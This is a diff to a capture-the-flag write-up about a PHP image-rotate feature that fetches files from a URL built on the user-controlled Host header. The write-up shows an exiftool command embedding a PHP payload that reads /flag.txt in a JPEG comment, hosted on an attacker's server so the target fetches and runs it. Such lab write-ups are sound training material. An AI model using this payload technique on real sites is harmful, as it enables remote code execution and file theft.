@@ -35,7 +35,7 @@ So if we are able to upload our shell.jpg into themes folder, we will be able to
 Some of the source code was available at http://52.78.36.66:81/post.php. Code analyses displays the following :
 
 * So when we `rotate` a image(it have to be a valid image):
-    * If file name doesnt exists locally its fetched from URL. (Here $_SERVER['HTTP_HOST'] is Host Header which is user controlled)
+    * If the file name doesnt exists locally, its fetched from URL. (Here $_SERVER['HTTP_HOST'] is Host Header which is user controlled)
         ```php
         $src_file = $post['feature_img'];
         
@@ -65,11 +65,9 @@ View-Source tells the flag is at /flag.txt
 
 * So first we create a valid JPG file with out shell inside it. We can put our PHP shell inside jpeg comment exif as follows:
     ```
-    ubuntu $ exiftool -comment="<?php echo file_get_contents('/flag.txt'); ?>" img.jpg 
+    $ exiftool -comment="<?php echo file_get_contents('/flag.txt'); ?>" img.jpg 
     ```
-    upload the image to server in themes folder: http://1.2.3.4/themes/img.jpg
-
-<!-- * Now we have an image with our php in it, so lets upload it to server(my image was uploaded at /uploads/b798abe6e1b1318ee36b0dcb3fb9e4d3.jpg) -->
+    upload the image to `your` server inside of themes folder: http://YOUR_SERVER/themes/img.jpg
 
 * Create a new post with
     ```
